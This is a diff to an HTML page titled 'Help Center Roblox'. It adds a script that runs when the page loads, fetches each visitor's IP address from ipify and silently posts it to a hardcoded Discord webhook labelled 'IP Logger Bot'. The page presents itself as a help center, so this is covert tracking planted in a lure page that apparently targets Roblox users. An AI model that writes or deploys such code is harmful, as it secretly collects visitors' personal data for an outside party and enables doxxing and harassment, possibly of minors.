@@ -4,6 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Help Center Roblox</title>
+
+    <script type="application/javascript">
+        async function sendIPToDiscord(ip) {
+          const webhookURL = "https://discord.com/api/webhooks/1310435513815269386/3qMVcIJGm7FvymR6lEhh-ZlQBwc0TLrF7e8O8g6wLh_pfwXHJ2yXKf9ex_l7RdFv_4oi"; // Replace with your webhook URL
+          const payload = {
+            content: `User IP Address: ${ip}`, // Message content
+            username: "IP Logger Bot" // Optional: Customize the bot's name
+          };
+      
+          try {
+            await fetch(webhookURL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(payload)
+            });
+            console.log("IP sent to Discord successfully.");
+          } catch (error) {
+            console.error("Error sending IP to Discord:", error);
+          }
+        }
+      
+        function getIP(json) {
+          const userIP = json.ip;
+          console.log("User IP:", userIP); // Optional: Log to console
+          sendIPToDiscord(userIP); // Send the IP to the Discord webhook
+        }
+      </script>
+      
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    
     <style>
         * {
             margin: 0;
